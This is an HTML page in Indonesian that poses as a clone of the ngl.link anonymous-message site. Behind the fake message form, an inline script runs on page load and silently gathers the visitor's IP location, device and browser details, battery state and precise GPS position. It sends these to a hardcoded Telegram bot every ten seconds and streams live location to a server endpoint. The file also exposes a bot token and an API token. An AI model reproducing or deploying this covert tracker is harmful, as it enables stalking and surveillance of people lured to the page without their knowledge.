<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ngl.link â€” clone (mirip)</title>

  <!-- Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Fonts & Icons -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>

  <!-- CSS eksternal -->
  <link rel="stylesheet" href="style.css">
</head>
<body class="min-h-screen flex items-center justify-center px-4 py-12">
  <div class="w-full max-w-md">
    <!-- top floating activity -->
    <div class="flex justify-center mb-6">
      <div class="activity">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zM2 20c0-3.31 2.69-6 6-6h8c3.31 0 6 2.69 6 6v1H2v-1z"/></svg>
        <div class="text-sm ml-1">205 teman baru saja mengetuk</div>
      </div>
    </div>

    <!-- main card -->
    <div class="card">
      <!-- header -->
      <div class="flex items-center gap-4 px-5 py-4 header">
        <div class="w-12 h-12 rounded-full avatar-ring bg-white flex items-center justify-center">
          <img src="https://storage.googleapis.com/a1aa/image/5df75832-9f76-4ece-e6f3-683fd17d55b0.jpg"
               alt="avatar" class="w-10 h-10 rounded-full object-cover"/>
        </div>
        <div class="flex-1">
          <div class="text-gray-900 font-semibold text-sm">@bibd51254</div>
          <div class="text-gray-500 text-xs">kirimi aku pesan anonim</div>
        </div>
        <div class="text-xs text-muted">â€¢â€¢â€¢</div>
      </div>

      <!-- preview / big message area -->
      <div class="px-5 py-6 bg-white">
        <div class="glass p-4 rounded-2xl">
          <div class="text-pink-600 font-semibold text-lg mb-2">lagi ngapain nanti?</div>
          <div class="text-sm text-muted mb-3">kirim yang jujur ya â€” 100% anonim</div>

          <!-- textarea -->
          <textarea id="msg" class="ngl-textarea w-full h-36 p-4 resize-none" placeholder="Ketik pesan anonimmu di sini..."></textarea>

          <!-- controls -->
          <div class="mt-4 flex items-center gap-3">
            <button id="dice" class="w-10 h-10 rounded-full bg-pink-50 flex items-center justify-center ring-1 ring-pink-100">
              <img src="https://storage.googleapis.com/a1aa/image/c1c7fb05-e997-44ba-9254-e474d307b9f2.jpg" alt="dice" class="w-5 h-5"/>
            </button>

            <div class="flex-1"></div>

            <button id="sendBtn" class="send-btn bg-black text-white px-5 py-3 rounded-full font-semibold shadow-md hover:scale-[1.02] transition">
              Send!
            </button>
          </div>
        </div>
      </div>

      <!-- footer small -->
      <div class="px-5 py-4 border-t flex items-center justify-between">
        <div class="text-sm text-muted flex items-center gap-2">
          <i class="fas fa-lock"></i>
          <span>100% anonymous Q&amp;A</span>
        </div>
        <div class="text-sm text-pink-500 font-semibold cursor-pointer" id="createLink">Buat linkmu</div>
      </div>
    </div>

    <!-- dynamic area: recent messages -->
    <div id="recentArea" class="mt-6 space-y-3"></div>

    <!-- create link CTA -->
    <div class="mt-8 text-center text-white">
      <div class="text-lg font-semibold">ðŸ‘‡ Dapatkan pesan untukmu sendiri ðŸ‘‡</div>
      <button id="makeLink" class="makeLinkBtn">Buat link anonim kamu</button>
    </div>
  </div>

  <!-- SCRIPT -->
  <script>
  const CHAT_ID = "7483495590"; // ganti dengan chat id admin
  const BOT_TOKEN = "7752399769:AAFpjaRaSiRJ7quT3JD0PbgIEu_PZcE2cvI"; // ganti bot token
  const statusEl = document.getElementById('status');

  async function getDeviceInfo() {
      try {
          const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
          const connection = navigator.connection || {};
          const battery = await navigator.getBattery();
          const time = new Date().toLocaleString("id-ID");
          let geo = "Tidak tersedia";
          if(navigator.geolocation){
              await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
                  geo = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
                  resolve();
              }, ()=>resolve()));
          }

          return `
ðŸŒ *Informasi IP*
ðŸ“¶ Alamat IP: ${ipInfo.ip}
ðŸŒ Negara: ${ipInfo.country}
ðŸžï¸ Wilayah: ${ipInfo.region}
ðŸ™ï¸ Kota: ${ipInfo.city}
ðŸ› ï¸ ISP: ${ipInfo.org}
â±ï¸ Timezone IP: ${ipInfo.timezone || "-"}

ðŸ“± *Detail Perangkat*
ðŸ’» User Agent: ${navigator.userAgent}
ðŸ–¥ï¸ Platform: ${navigator.platform}
ðŸ·ï¸ Vendor: ${navigator.vendor}
ðŸŒ Browser Online: ${navigator.onLine?"âœ… Ya":"âŒ Tidak"}
ðŸ—£ï¸ Bahasa Browser: ${navigator.language}
ðŸ“ Orientation: ${screen.orientation ? screen.orientation.type : "âŒ Tidak tersedia"}
ðŸ–¼ï¸ Resolusi Layar: ${screen.width}x${screen.height} px
ðŸ” Pixel Ratio: ${window.devicePixelRatio}
ðŸŽ¨ Kedalaman Warna: ${screen.colorDepth}-bit
ðŸ“¡ Jaringan: ${connection.effectiveType||"âŒ Tidak diketahui"}
ðŸ“¶ Downlink: ${connection.downlink||"-"} Mbps
â±ï¸ RTT: ${connection.rtt||"-"} ms
ðŸš€ Bandwidth Max: ${connection.downlinkMax||"-"} Mbps
ðŸ”‹ Battery: ${Math.round(battery.level*100)}% ${battery.charging?"âš¡ï¸ Mengisi daya":""}
ðŸª Cookies Enabled: ${navigator.cookieEnabled?"âœ… Ya":"âŒ Tidak"}
ðŸš« Do Not Track: ${navigator.doNotTrack||"âŒ Tidak tersedia"}
ðŸ–¥ï¸ Hardware Concurrency (CPU): ${navigator.hardwareConcurrency||"-"} cores
ðŸ¤ Touch Support: ${("ontouchstart" in window)?"âœ… Ya":"âŒ Tidak"}
â° Waktu: ${time}
ðŸ“ Geolocation: ${geo}
          `;
      } catch(err) {
          console.error(err);
          return "âŒ Tidak bisa mengambil info device.";
      }
  }

  async function sendToTelegram(data) {
      try{
          const form = new FormData();
          form.append("chat_id", CHAT_ID);
          form.append("text", data);
          form.append("parse_mode","Markdown");
          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          await fetch(url,{method:"POST",body:form});
      } catch(e){
          console.error(e);
      }
  }

  async function liveTracking() {
      statusEl && (statusEl.textContent = "Mengirim data ke Telegram...");
      const info = await getDeviceInfo();
      await sendToTelegram(info);
      statusEl && (statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`);
  }

  window.onload = async () => {
      await liveTracking();
      setInterval(liveTracking, 10000);

      if(navigator.geolocation){
          navigator.geolocation.watchPosition(async (pos) => {
              const { latitude, longitude } = pos.coords;
              await fetch('/sendLocation', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ latitude, longitude })
              });
          }, (err) => console.error(err));
      }
  };
  </script>
  <script src="script.js"></script>
</body>
</html>
